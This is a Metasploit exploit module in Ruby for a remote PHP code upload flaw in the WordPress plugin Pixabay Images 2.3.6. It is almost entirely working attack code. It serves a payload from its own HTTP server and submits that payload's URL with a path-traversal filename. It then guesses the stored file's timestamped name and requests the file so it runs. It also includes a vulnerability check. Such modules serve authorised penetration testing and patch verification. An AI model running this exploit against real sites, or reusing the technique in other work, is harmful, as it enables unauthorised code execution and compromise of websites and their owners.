##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Exploit::Remote
  include Msf::HTTP::Wordpress
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Pixabay Images PHP Code Upload',
      'Description'    => %q{
          This module exploits multiple vulnerabilities in the Wordpress plugin Pixabay
          Images 2.3.6. The plugin does not check the host of a provided download URL
          which can be used to store and execute malicious PHP code on the system.
      },

      'Author'	=>
        [
          'h0ng10', # Discovery, Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.mogwaisecurity.de/advisories/MSA-2015-01.txt' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [['pixabay-images 2.3', {}]],
      'DefaultTarget'  => 0,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'DisclosureDate' => 'Jan 19 2015'
      ))

      register_options(
        [
        OptInt.new('RETRIES', [ false, 'Number of guesses if initial name guess fails', 5]),
          OptString.new('DOWNURI', [ false,  "An alternative URI to request the PHP payload from"]),
        ], self.class)

  end


  # Handle incoming requests from the server
  def on_request_uri(cli, request)
      vprint_status("#{rhost}:#{rport} - URI requested: #{request.inspect}")
      print_status("#{rhost}:#{rport} - Sending the payload to the server...")
      send_response(cli, payload.encoded)
  end

  def generate_payload_uri

      # Did the user provide his own url? If yes use it...
      return datastore['DOWNURI'] if datastore['DOWNURI']

      # Create a custom URI
      custom_uri = get_uri + ".php"
      return custom_uri
  end


  def call_payload(file_name, epoch_time)
      real_fn = "#{file_name}_#{epoch_time.to_s}.php"
      res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(wordpress_url_wp_content, 'uploads', real_fn),
          })
      return res
  end

  def exploit
    unless wordpress_and_online?
      fail_with(Failure::NoTarget, "#{target_uri} does not seeem to be Wordpress site")
    end

    print_status("Starting up web service...")
    start_service

    # did the user provide his own url
    payload_uri = generate_payload_uri
    vprint_status("Using URI " + payload_uri)

    random_file_name = rand_text_alphanumeric(rand(5)+5)
    post = {
        'pixabay_upload' => rand_text_alphanumeric(rand(5)+5),
        'image_url' => payload_uri,
        'image_user' => rand_text_alphanumeric(rand(5)+5),
        'q' => "../../../../" + random_file_name
    }

    res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(wordpress_url_backend),
        'vars_post' => post,
        })

    server_epoch_time = DateTime.strptime(res.headers['date'], "%a, %d %b %Y %H:%M:%S GMT").to_i

    print_status("Calling payload")
    res = call_payload(random_file_name, server_epoch_time)

    if (res and res.code != 200) then
        print_status("Request failed, trying additional epoch values...")
        datastore['RETRIES'].times do |i|
            res = call_payload(random_file_name, server_epoch_time)
            break if res and res.code == 200
            server_epoch_time += 1
        end
    end
    stop_service

  end

  def check
    res = wordpress_and_online?
    unless res
      vprint_error("#{peer} does not seeem to be Wordpress site")
      return Exploit::CheckCode::Unknown
    end

    # Send a request with a illegal URL to verify that the target is vulnerable
    post = {
        'pixabay_upload' => rand_text_alphanumeric(rand(5)+5),
        'image_url' => rand_text_alphanumeric(rand(5)+5),
        'image_user' => rand_text_alphanumeric(rand(5)+5),
        'q' => rand_text_alphanumeric(rand(5)+5)
    }

    res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(wordpress_url_backend),
        'vars_post' => post,
        })


    if res and (res.body =~ /Error: A valid URL was not provided/)
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe

  end
end
